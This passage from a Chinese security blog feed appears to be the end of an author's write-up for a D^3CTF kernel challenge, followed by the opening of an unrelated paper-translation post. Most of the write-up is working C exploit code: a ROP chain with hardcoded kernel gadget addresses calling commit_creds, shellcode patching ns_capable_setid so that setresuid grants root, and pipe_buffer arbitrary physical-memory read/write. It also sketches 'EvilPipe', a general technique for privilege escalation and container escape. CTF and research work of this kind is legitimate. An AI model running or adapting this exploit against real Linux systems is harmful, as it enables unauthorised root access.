class="hljs-comment"> * So just simply overwrite the task_struct is good :)</span><br><span class="hljs-comment"> * </span><br><span class="hljs-comment"> * If you still want a normal ROP, refer to following codes.</span><br><span class="hljs-comment">*/</span><br><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> COMMIT_CREDS 0xffffffff811284e0</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE 0xffffffff82201a90</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> INIT_CRED 0xffffffff83079ee8</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> POP_RDI_RET 0xffffffff810157a9</span><br><span class="hljs-meta">#<span class="hljs-keyword">define</span> RET 0xffffffff810157aa</span><br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_rop</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> rop[<span class="hljs-number">0x1000</span>], idx = <span class="hljs-number">0</span>; <br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br>    <br>    <span class="hljs-comment">/* reading the page table directly to get physical addr of kernel stack*/</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Reading page table...&quot;</span>);<br><br>    stack_addr_another = vaddr_resolve(pgd_addr, stack_addr);<br>    stack_addr_another &amp;= (~PAGE_ATTR_NX); <span class="hljs-comment">/* N/X bit */</span><br>    stack_addr_another += page_offset_base;<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got another virt addr of kernel stack: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, stack_addr_another);<br><br>    <span class="hljs-comment">/* construct the ROP */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; ((<span class="hljs-number">0x1000</span> - <span class="hljs-number">0x100</span>) / <span class="hljs-number">8</span>); i++) &#123;<br>        rop[idx++] = RET + kernel_offset;<br>    &#125;<br><br>    rop[idx++] = POP_RDI_RET + kernel_offset;<br>    rop[idx++] = INIT_CRED + kernel_offset;<br>    rop[idx++] = COMMIT_CREDS + kernel_offset;<br>    rop[idx++] = SWAPGS_RESTORE_REGS_AND_RETURN_TO_USERMODE +<span class="hljs-number">54</span> + kernel_offset;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = *(<span class="hljs-type">size_t</span>*) <span class="hljs-string">&quot;arttnba3&quot;</span>;<br>    rop[idx++] = (<span class="hljs-type">size_t</span>) get_root_shell;<br>    rop[idx++] = user_cs;<br>    rop[idx++] = user_rflags;<br>    rop[idx++] = user_sp;<br>    rop[idx++] = user_ss;<br><br>    stack_page = direct_map_addr_to_page_addr(stack_addr_another);<br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Hijacking current task&#x27;s stack...&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    arbitrary_write_by_pipe((<span class="hljs-keyword">struct</span> page*) (stack_page + <span class="hljs-number">0x40</span> * <span class="hljs-number">3</span>), rop, <span class="hljs-number">0xff0</span>);<br>&#125;<br><br><span class="hljs-type">void</span> <span class="hljs-title function_">privilege_escalation_by_usma</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-meta">#<span class="hljs-keyword">define</span> NS_CAPABLE_SETID 0xffffffff810fd2a0</span><br><br>    <span class="hljs-type">char</span> *kcode_map, *kcode_func;<br>    <span class="hljs-type">size_t</span> dst_paddr, dst_vaddr, *rop, idx = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* resolving some vaddr */</span><br>    pgd_vaddr_resolve();<br><br>    kcode_map = mmap((<span class="hljs-type">void</span>*) <span class="hljs-number">0x114514000</span>, <span class="hljs-number">0x2000</span>, PROT_READ | PROT_WRITE, <br>                     MAP_ANONYMOUS | MAP_PRIVATE, <span class="hljs-number">-1</span>, <span class="hljs-number">0</span>);<br>    <span class="hljs-keyword">if</span> (!kcode_map) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to create mmap area!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* because of lazy allocation, we need to write it manually */</span><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">8</span>; i++) &#123;<br>        kcode_map[i] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>        kcode_map[i + <span class="hljs-number">0x1000</span>] = <span class="hljs-string">&quot;arttnba3&quot;</span>[i];<br>    &#125;<br><br>    <span class="hljs-comment">/* overwrite kernel code seg to exec shellcode directly :) */</span><br>    dst_vaddr = NS_CAPABLE_SETID + kernel_offset;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[34m\033[1m[*] vaddr of ns_capable_setid is: \033[0m0x%lx\n&quot;</span>,<br>           dst_vaddr);<br><br>    dst_paddr = vaddr_resolve_for_3_level(pgd_addr, dst_vaddr);<br>    dst_paddr += <span class="hljs-number">0x1000</span> * PTE_ENTRY(dst_vaddr);<br><br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;\033[32m\033[1m[+] Got ns_capable_setid&#x27;s phys addr: \033[0m&quot;</span><br>           <span class="hljs-string">&quot;0x%lx\n\n&quot;</span>, dst_paddr);<br><br>    <span class="hljs-comment">/* remapping to our mmap area */</span><br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span>, dst_paddr);<br>    vaddr_remapping(pgd_addr, <span class="hljs-number">0x114514000</span> + <span class="hljs-number">0x1000</span>, dst_paddr + <span class="hljs-number">0x1000</span>);<br><br>    <span class="hljs-comment">/* overwrite kernel code segment directly */</span><br><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] Start overwriting kernel code segment...&quot;</span>);<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * The setresuid() check for user&#x27;s permission by ns_capable_setid(),</span><br><span class="hljs-comment">     * so we can just patch it to let it always return true :)</span><br><span class="hljs-comment">     */</span><br>    <span class="hljs-built_in">memset</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>), <span class="hljs-string">&#x27;\x90&#x27;</span>, <span class="hljs-number">0x40</span>); <span class="hljs-comment">/* nop */</span><br>    <span class="hljs-built_in">memcpy</span>(kcode_map + (NS_CAPABLE_SETID &amp; <span class="hljs-number">0xfff</span>) + <span class="hljs-number">0x40</span>, <br>            <span class="hljs-string">&quot;\xf3\x0f\x1e\xfa&quot;</span>  <span class="hljs-comment">/* endbr64 */</span><br>            <span class="hljs-string">&quot;H\xc7\xc0\x01\x00\x00\x00&quot;</span>  <span class="hljs-comment">/* mov rax, 1 */</span><br>            <span class="hljs-string">&quot;\xc3&quot;</span>, <span class="hljs-comment">/* ret */</span><br>            <span class="hljs-number">12</span>);<br><br>    <span class="hljs-comment">/* get root now :) */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[*] trigger evil ns_capable_setid() in setresuid()...\n&quot;</span>);<br><br>    sleep(<span class="hljs-number">5</span>);<br><br>    setresuid(<span class="hljs-number">0</span>, <span class="hljs-number">0</span>, <span class="hljs-number">0</span>);<br>    get_root_shell();<br>&#125;<br><br><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * Just for testing CFI&#x27;s availability :)</span><br><span class="hljs-comment">*/</span><br><span class="hljs-type">void</span> <span class="hljs-title function_">trigger_control_flow_integrity_detection</span><span class="hljs-params">(<span class="hljs-type">void</span>)</span><br>&#123;<br>    <span class="hljs-type">size_t</span> buf[<span class="hljs-number">0x1000</span>];<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buffer</span> *<span class="hljs-title">pbuf</span> =</span> (<span class="hljs-type">void</span>*) ((<span class="hljs-type">size_t</span>)buf + TRD_PIPE_BUF_SZ);<br>    <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">pipe_buf_operations</span> *<span class="hljs-title">ops</span>, *<span class="hljs-title">ops_addr</span>;</span><br><br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) <br>                 (((<span class="hljs-type">size_t</span>) info_pipe_buf.page - vmemmap_base) / <span class="hljs-number">0x40</span> * <span class="hljs-number">0x1000</span>);<br>    ops_addr = (<span class="hljs-keyword">struct</span> pipe_buf_operations*)((<span class="hljs-type">size_t</span>)ops_addr+page_offset_base);<br><br>    <span class="hljs-comment">/* two random gadget :) */</span><br>    ops = (<span class="hljs-keyword">struct</span> pipe_buf_operations*) buf;<br>    ops-&gt;confirm = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff81a78568</span> + kernel_offset);<br>    ops-&gt;release = (<span class="hljs-type">void</span>*)(<span class="hljs-number">0xffffffff816196e6</span> + kernel_offset);<br><br>    <span class="hljs-keyword">for</span> (<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10</span>; i++) &#123;<br>        pbuf-&gt;ops = ops_addr;<br>        pbuf = (<span class="hljs-keyword">struct</span> pipe_buffer *)((<span class="hljs-type">size_t</span>) pbuf + TRD_PIPE_BUF_SZ);<br>    &#125;<br><br>    evil_2nd_buf.page = info_pipe_buf.page;<br>    evil_2nd_buf.offset = <span class="hljs-number">0</span>;<br>    evil_2nd_buf.len = <span class="hljs-number">0</span>;<br><br>    <span class="hljs-comment">/* hijack the 4th pipe pointing to 2nd pipe */</span><br>    write(pipe_fd[self_3rd_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_4th_buf,<span class="hljs-keyword">sizeof</span>(evil_4th_buf));<br><br>    <span class="hljs-comment">/* hijack the 2nd pipe for arbitrary read, 3rd pipe point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_2nd_buf,<span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>], <br>          temp_zero_buf, <br>          TRD_PIPE_BUF_SZ - <span class="hljs-keyword">sizeof</span>(evil_2nd_buf));<br>        <br>    <span class="hljs-comment">/* hijack the 3rd pipe to point to 4th pipe */</span><br>    write(pipe_fd[self_4th_pipe_pid][<span class="hljs-number">1</span>],&amp;evil_3rd_buf,<span class="hljs-keyword">sizeof</span>(evil_3rd_buf));<br><br>    <span class="hljs-comment">/* write data into dst page */</span><br>    write(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>], buf, <span class="hljs-number">0xf00</span>); <br><br>    <span class="hljs-comment">/* trigger CFI... */</span><br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;[=] triggering CFI&#x27;s detection...\n&quot;</span>);<br>    sleep(<span class="hljs-number">5</span>);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">0</span>]);<br>    close(pipe_fd[self_2nd_pipe_pid][<span class="hljs-number">1</span>]);<br>&#125;<br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">char</span> **argv, <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.O - fundamental works</span><br><span class="hljs-comment">     */</span><br><br>    save_status();<br><br>    <span class="hljs-comment">/* bind core to 0 */</span><br>    bind_core(<span class="hljs-number">0</span>);<br><br>    <span class="hljs-comment">/* dev file */</span><br>    dev_fd = open(<span class="hljs-string">&quot;/dev/d3kcache&quot;</span>, O_RDWR);<br>    <span class="hljs-keyword">if</span> (dev_fd &lt; <span class="hljs-number">0</span>) &#123;<br>        err_exit(<span class="hljs-string">&quot;FAILED to open /dev/d3kcache!&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">/* spray pgv pages */</span><br>    prepare_pgv_system();<br>    prepare_pgv_pages();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.I - page-level heap fengshui to make a cross-cache off-by-null,</span><br><span class="hljs-comment">     * making two pipe_buffer pointing to the same pages</span><br><span class="hljs-comment">     */</span><br>    corrupting_first_level_pipe_for_page_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.II - re-allocate the victim page to pipe_buffer,</span><br><span class="hljs-comment">     * leak page-related address and construct a second-level pipe uaf</span><br><span class="hljs-comment">     */</span><br>    corrupting_second_level_pipe_for_pipe_uaf();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.III - re-allocate the second-level victim page to pipe_buffer,</span><br><span class="hljs-comment">     * construct three self-page-pointing pipe_buffer </span><br><span class="hljs-comment">     */</span><br>    building_self_writing_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.IV - leaking fundamental information by pipe</span><br><span class="hljs-comment">     */</span><br>    info_leaking_by_arbitrary_pipe();<br><br>    <span class="hljs-comment">/**</span><br><span class="hljs-comment">     * Step.V - different method of exploitation</span><br><span class="hljs-comment">     */</span><br><br>    <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;rop&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* traditionally root by rop */</span><br>        privilege_escalation_by_rop();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;cfi&quot;</span>)) &#123;<br>        <span class="hljs-comment">/* extra - check for CFI&#x27;s availability */</span><br>        trigger_control_flow_integrity_detection();<br>    &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (argv[<span class="hljs-number">1</span>] &amp;&amp; !<span class="hljs-built_in">strcmp</span>(argv[<span class="hljs-number">1</span>], <span class="hljs-string">&quot;usma&quot;</span>)) &#123;<br>        privilege_escalation_by_usma();<br>    &#125;<span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-comment">/* default: root by seeking init_task and overwrite current */</span><br>        privilege_escalation_by_task_overwrite();<br>    &#125;<br><br>    <span class="hljs-comment">/* we SHOULDN&#x27;T get there, so panic :( */</span><br>    trigger_control_flow_integrity_detection();<br>    <br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br><br></code></pre></td></tr></table></figure><h1 id="0x03-解题情况"><a href="#0x03-解题情况" class="headerlink" title="0x03.解题情况"></a>0x03.解题情况</h1><p>本次比赛当中一共有 2 支队伍解出了笔者的题目，这个数量倒是出乎笔者的预料又在预料之中（<del>既感觉好多又感觉好少</del>），比较巧的是 <em>刚好一支国内队伍与一支国外队伍</em> ：）</p><p>NU1L 战队的解法是利用 partial overwrite 覆写 <code>msg_msg-&gt;m_list.next</code> 构造 UAF（有点像 CVE-2021-22555 的解法），分配 <code>msg_msgseg</code> 来构造 <code>fake msg_msg</code> 实现越界读，之后利用 <code>fcntl(F_SETPIPE_SZ)</code> 改小 <code>pipe_buffer</code> 后转移 UAF 到 <code>pipe_buffer</code> 上从而构造 dirty pipe 覆写 busybox，不过比较出乎笔者预料的是他们并没有用页级堆风水，而是选择<strong>直接堆喷大量 msg_msg</strong>，这样题目所在的 slub 页面与 <code>msg_msg</code> 所在 slub 页面便还是有一定几率挨到一起（由于大小 0x1000 的 <code>msg_msg</code> 所在 slab <strong>同样来自于 order-3</strong>，因此实际上仅纯堆喷也有一定的几率使得对应 slab 挨在一起）</p><p>TeamGoulash 的解法前半段与官方解法的中段基本上是一致的，即利用  <code>fcntl(F_SETPIPE_SZ)</code> 改大  <code>pipe_buffer</code> 到 order-3 后通过对 page 指针的 partial overwrite 构造 page-level 的 UAF，之后在 UAF page 上分配新的 <code>pipe_buffer</code> ，不过他们并没有像笔者那样继续构造自读写管道来完成内存空间任意读写，<strong>而是将 UAF page 分配为新进程的页表页面</strong>（由于 COW 机制，<code>fork()</code> 创建新进程的过程中其实仅会分配新的页表项及其他内核结构体，这使得我们有不小的概率使 UAF 页面被复用为页表中的某一级页面），之后<strong>将 busybox 映射到 UAF 页表项对应的内存空间，从而完成越权写入</strong>，由于缺乏有效的堆风水手段以及页分配的不稳定性导致<strong>成功率较低</strong>（毕竟分配过程当中还是有非常多的噪音，据该战队自述成功率只有 5%）</p><blockquote><p>以及 TeamGoulash 为笔者展现了一个很有趣的操作：通过睡眠一定的时间使得旧的 TLB 无效化</p><p><img src="https://s2.loli.net/2023/05/01/SFKbgnzPJdIYUZT.png" alt="TeamGoulash 在 WP 中的表情.jpg"></p></blockquote><p>两只战队的解法大体上其实都在预期之内（笔者一开始想的就是利用 <code>msg_msg</code> ），同时这道题目没有出现去年那样的大面积非预期情况，可喜可贺可喜可贺👏👏👏</p><h1 id="0x04-总结与反思"><a href="#0x04-总结与反思" class="headerlink" title="0x04. 总结与反思"></a>0x04. 总结与反思</h1><h2 id="pipe-buffer-arbitray-read-amp-write？"><a href="#pipe-buffer-arbitray-read-amp-write？" class="headerlink" title="pipe_buffer arbitray read &amp; write？"></a>pipe_buffer arbitray read &amp; write？</h2><p>毫不谦虚地说，笔者认为自己出的这道题目在对于内核中内存损坏类型漏洞的 “通解” 的探索相比<a href="https://arttnba3.cn/2022/03/08/CTF-0X06-D3CTF2022_D3KHEAP">去年</a>而言是有着一定距离的突破的——我们成功在一个非常极端的环境下完成了内核漏洞利用</p><p>而如果将官方解在不同漏洞场景下进行推广，得益于 <code>pipe_buffer</code> 大小的可调节性以及无需 <code>bzImage</code> 信息便能完成提权的便捷性，我们不难发现的是<strong>这个方法可以被很快地应用并推广到绝大部分的漏洞上，并在真实场景下完成漏洞利用</strong>，这也是为什么笔者要魔改《eva：终》的宣传语来作为题目描述——<strong>我们或许真的为内核内存损坏型漏洞找到了一种足够强大的通法：）</strong></p><p>不过这种方法并非是笔者第一个发现的（虽然笔者一开始确乎这么以为），据笔者了解类似的改写 <code>pipe_buffer.page</code> 的方法似乎早已被应用到实战的安卓攻防当中，同时<a href="https://interruptlabs.co.uk/labs/pipe_buffer/">来自 Interrupt Labs 的研究员也在去年发现了这种方法</a></p><blockquote><p>该 Lab 的安全研究员一开始也以为自己独立发现了一种新方法，结果一看 <a href="https://i.blackhat.com/USA-22/Wednesday/US-22-Jin-Monitoring-Surveillance-Vendors.pdf">BlackHat 上好像讲过在安卓上已经存在在野利用了</a>，<del>和笔者同病相怜属于是</del></p></blockquote><p>虽然说这种方法似乎没有被正式命名，但是既然早就存在在野利用的话那自然笔者是没有命名资格了，至少笔者不会为了所谓 “青史留名” 而擅自将这种早就出现过的利用方法冠上自己的名字（笑）</p><!--glibc 利用近几年国内新出现的少数几个所谓 “house of xx” 在笔者看来真的是难以形容......这也是笔者为什么最近基本上没有在做常规的 Linux 用户态 pwn 的缘故（当然虚拟化逃逸还是挺有意思的），新出现的一些东西有点过于浮躁且浮夸了：( \n当然这并不代表笔者认为这些人或是这些事情恶心，也不代表笔者对这样的现象的一种批判--><h2 id="page-level-UAF"><a href="#page-level-UAF" class="headerlink" title="page-level UAF?"></a>page-level UAF?</h2><p>不过虽然说利用 <code>pipe_buffer</code> 进行内存任意读写的操作并非作者首创，但是 <em>在内存页这一级进行 double free 以及 UAF 利用据笔者所知应该是笔者首创</em> ，有了 page-level UAF，我们可以很轻易地在不同的 <code>kmem_cache</code> 之间进行跨 <code>kmem_cache</code> 的 UAF 利用，从而打破 <code>kmem_cache</code> 甚至是直接进行内存页分配的其他子系统之间的间隔（例如页表），目前笔者所设想的利用手法有：</p><ul><li>将一张 page 释放成为另一张 page，从而完成对指定内核对象的 UAF利用（这便是本题的做法）<ul><li>可以是针对 page 进行 double free</li><li>也可以是 slab objects 的全部释放导致的 slab free 后的 page UAF</li><li>…</li></ul></li><li>将一张 page 释放为内核子系统中的某个组件<ul><li>例如：页表</li><li>…</li></ul></li></ul><p>作为刚刚出现在 CTF 当中的新的利用手法，page-level UAF 还有更多值得我们去探索的地方</p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>总的来说，笔者对于自己今年所出的这一道题还是挺满意的，希望未来能够给大家带来更多更有趣的内核漏洞利用手法 ：）</p><h1 id="0xFF-一些小彩蛋"><a href="#0xFF-一些小彩蛋" class="headerlink" title="0xFF. 一些小彩蛋"></a>0xFF. 一些小彩蛋</h1><blockquote><p>笔者个人发疯部分，这里可以不用看了（笑）</p></blockquote><p>最近写论文写得快疯魔了，所以笔者为这道题目也简单写了一段：）</p><blockquote><p>《<strong>EvilPipe: Another General Exploitation Method On Linux kernel Vulnerabilities</strong>》</p><p><strong>Abstract</strong></p><p>在实战中对 Linux kernel 的内存损坏漏洞进行利用往往需要面临诸多挑战，来自硬件与软件层面的诸多保护使得漏洞利用变得困难，内核镜像信息的缺失也令合法攻击载荷的构造变得不可能；现有的一些工作也在尝试寻找无需进行控制流劫持的更具有通用性的攻击手法，如 Pipe Primitive 选择将漏洞形式转换为 DirtyPipe 完成利用，DirtyCred 则将漏洞转换为对内核中的 credentials 结构体的改写以完成利用；但这些利用手法往往仍需要一定级别的权限（例如，至少需要能够读取或执行特权文件），仍然缺乏足够的通用性</p><p>本文介绍 EvilPipe——一种更具有通用性的利用手法，这项技术允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的无限的对物理内存的任意读写能力，并能完美绕过包括 KASLR、SMEP、SMAP 在内的多项主流缓解措施；有了 EvilPipe，一个恶意的本地攻击者可以在无需内核镜像信息的情况下通过已知的内核漏洞完成提权与容器逃逸；我们在多个保护完备的 Linux 系统下对多个 <code>（此处暂定）</code> 真实世界中的漏洞完成了对这种利用手法的评估，并发现 EvilPipe 在多个 <code>（此处暂定）</code> 真实世界的漏洞上可以完成利用，这意味着这项技术的通用性；在完成可用性评估之后，我们提出了一种新的保护机制，通过在数据拷贝前添加额外的验证机制以防止 EvilPipe 类型的利用方法，经实验评估，我们所提出的新机制带来的负担是可以忽略不计的</p><p><strong>KEYWORDS</strong></p><p>OS Security; Kernel Exploitation; Privilege Escalation</p><p><strong>1 INTRODUCTION</strong></p><p>现如今 Linux 已然成为全世界最为流行的开源操作系统，得益于其开源的特性与优秀的设计，我们可以在包括云服务器、移动设备、物联网设备、网络基础设施在内的绝大部分设备上看到 Linux 内核的身影，而极高的流行性也令 Linux 吸引了无数网络攻击者与黑客们的兴趣。虽然 Linux 内核每年被爆出的漏洞高达数百个[3]，但在实战中对内核漏洞的利用往往面临着一系列困难的挑战。从内核层面而言，诸如 KASLR[1]、KPTI [2]、 CFI[4] 等保护为控制流劫持攻击增添了不少难度。从硬件层面而言， SMEP、SMAP、NX-bit 等保护也令形如 ret2usr[5]、ret2dir[5] 这样的攻击变得极为困难。内核镜像信息的缺失更是使得攻击者无法获取到内核代码片段的具体信息，从而使得类似 ROP&#x2F;JOP 这样的利用手法难以被应用。</p><p>相较于劫持内核的执行流，在实战中更受人青睐的内核漏洞则是无需特定于某个内核二进制信息的逻辑类漏洞。曾经非常火热的 CVE-2016-5195（也被称为 “DirtyCOW”）便是一个非常经典的这样的逻辑漏洞，其通过 Linux 内核中的条件竞争漏洞完成对特权文件的越权写入以进行提权，而不需要直接对抗内核中的诸多安全机制，这使得这个漏洞能够适用于实战中的多个不同的复杂场景。CVE-2022-0847（也被称为“DirtyPipe”）由于其类似的通用性于去年在安全界变得流行，其为一个对 pipe 结构体中标志位的错误设置，这可以使得攻击者利用该漏洞完成对特权文件的越权写入以进行提权，而不需要直接对抗内核中的多种保护。</p><p>在本文中我们提出了一种更为通用、强大的利用方法，称之为 EvilPipe。这项技术利用了内核中管道结构体的可重分配性与高度灵活性，这允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的近乎无限的对物理内存的任意读写能力，这意味着我们可以通过这种利用方法获取对内核的完全控制权，从而无需直接对抗任何主流的保护措施便能完成内核提权与容器逃逸的工作。同时，这项技术并不需要任何更高的系统权限（例如，读取 &#x2F;etc&#x2F;passwd），也不依赖于系统环境中的任何特权文件（例如， pkexec），且不需要任何额外的特定于内核镜像的内核信息，这意味着我们可以在绝大部分存在已知漏洞的Linux系统上直接应用这种利用手法完成攻击，因此这种方法在实战当中具有极高的可用性。</p><p>相比于其他的利用技术， EvilPipe 有着如下优点。首先，EvilPipe 的核心仅是 pipe 系统调用，作为一个基础设施 pipe 系统调用在每一个基于 Linux 的系统上都是可以使用的，这意味着 EvilPipe 近乎不存在任何的使用门槛。其次，EvilPipe 有着高度的灵活性，可以完美契合多个不同大小的内核漏洞对象。对于 UAF 漏洞而言，EvilPipe 仅要求漏洞对象与通用的 GFP_KERNEL_ACCOUNT 分配标志位来自同一 kmem_cache（内核当中的大部分对象都满足该要求）。对于溢出漏洞而言，EvilPipe 的最低要求仅为一个 \0 字节（这同样适用于跨 kmem_cache 间内存页的溢出，我们将在后文使用一种名为页级堆风水的技术来完成它）。这意味着我们可以将绝大部分的内存损坏类漏洞转换为 EvilPipe 以完成利用。最后，EvilPipe 不直接与任何的内核保护措施进行对抗，也不需要关于当前内核的任何信息，且不会留下任何痕迹，这意味着 EvilPipe 可以被应用于近乎所有的攻击环境。</p><p>此外，我们认为 EvilPipe 并不仅代表针对 pipe 系统调用的利用方法，而是代表了与传统的漏洞利用技术所不同的研究方向：将内核漏洞利用方法从传统的代码执行转向构造逻辑漏洞，从而无需直接与众多内核保护措施进行直接对抗，并大幅减少漏洞利用对特定于指定环境的依赖度。我们认为在漏洞利用上这是一个值得令人探索的方向。</p><p>在完成概念验证之后，我们将多个 Linux 内核中的内存损坏漏洞改写为 EvilPipe，并在多个保护完备的 Linux 系统下对多个 <code>（此处暂定）</code> 真实世界中的漏洞完成了对这种利用手法的评估。我们发现 EvilPipe 在多个 <code>（此处暂定）</code> 真实世界的漏洞上可以完成利用，这意味着这项技术具有强大的能力。在完成可利用性评估之后，我们提出了一种新的保护机制，通过在数据拷贝前添加额外的验证机制以防止 EvilPipe 类型的利用方法，经实验评估，我们所提出的新机制带来的负担是可以忽略不计的。</p><p>总而言之，本文做了如下工作：</p><ul><li>我们提出了一种新的通用利用技术——EvilPipe，这项技术允许我们将绝大多数的内核中的内存损坏漏洞（甚至仅是一个 ‘\0’ 字节的堆溢出），转换为无需任何特权的无限的对物理内存的任意读写能力</li><li>我们在多个真实世界的漏洞上应用了 EvilPipe ，这展示了其强大的通用性与易用性。同时我们发现了一些可能应用类似于 EvilPipe 的逻辑攻击手法的内核对象。</li><li>我们分析了 Linux 内核现有的防御机制在对抗逻辑漏洞上的不足，并提出了新的保护机制。我们对这项新机制进行了评估，发现其带来的负担是可以忽略不计的。</li></ul></blockquote>]]></content>
    
    
    <summary type="html">&lt;p&gt;「さらば、全てのリヌクス カーネル エクスプロイテーション。」&lt;/p&gt;</summary>
    
    
    
    <category term="CTF" scheme="https://arttnba3.github.io/categories/CTF/"/>
    
    
    <category term="Linux" scheme="https://arttnba3.github.io/tags/Linux/"/>
    
    <category term="Pwn" scheme="https://arttnba3.github.io/tags/Pwn/"/>
    
    <category term="信息安全" scheme="https://arttnba3.github.io/tags/%E4%BF%A1%E6%81%AF%E5%AE%89%E5%85%A8/"/>
    
    <category term="CTF" scheme="https://arttnba3.github.io/tags/CTF/"/>
    
    <category term="Linux Kernel" scheme="https://arttnba3.github.io/tags/Linux-Kernel/"/>
    
    <category term="D^3CTF" scheme="https://arttnba3.github.io/tags/D-3CTF/"/>
    
    <category term="Heap Overflow" scheme="https://arttnba3.github.io/tags/Heap-Overflow/"/>
    
    <category term="Cross-Cache Overflow" scheme="https://arttnba3.github.io/tags/Cross-Cache-Overflow/"/>
    
    <category term="Page-level Heap Fengshui" scheme="https://arttnba3.github.io/tags/Page-level-Heap-Fengshui/"/>
    
  </entry>
  
  <entry>
    <title>【PAPER.0x02】论文笔记：Virtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions </title>
    <link href="https://arttnba3.github.io/2023/04/14/PAPER-0X02_VTW/"/>
    <id>https://arttnba3.github.io/2023/04/14/PAPER-0X02_VTW/</id>
    <published>2023-04-13T15:46:35.000Z</published>
    <updated>2023-10-20T17:43:39.166Z</updated>
    
    <content type="html"><![CDATA[<p>任何 rootkit，终将绳之以法！</p><span id="more"></span><h1 id="0x00-一切开始之前"><a href="#0x00-一切开始之前" class="headerlink" title="0x00. 一切开始之前"></a>0x00. 一切开始之前</h1><p>笔者的毕业设计完成的要求之一便是需要完整翻译一篇与该领域相关的论文，刚好笔者做的是反病毒相关的，因此就选了<a href="https://ieeexplore.ieee.org/document/9186825">《Virtual Wall: Filtering Rootkit Attacks To Protect Linux Kernel Functions》</a>这篇论文</p><p>本篇博客说是论文笔记，其实就是<strong>一篇完整的论文翻译：）</strong></p><blockquote><p>不过在笔者翻译完之后才发现作者似乎是华人，<del>感觉有点亏了，毕竟主要是出于翻译的目的，但是却没能体会到原汁原味的 native speaker 的论文</del></p></blockquote><h2 id="Abstract"><a href="#Abstract" class="headerlink" title="Abstract"></a>Abstract</h2><p>如今 Linux 服务器已被在几乎所有的云、数据中心与超级电脑上使用。Linux 内核功能正面临着一种称之为 <code>rootkits</code> 的带有 root 访问权限的恶意软件攻击。rootkits 在如今的 Linux 服务器上以 <em>可装载内核模块</em> （Loadable Kernel 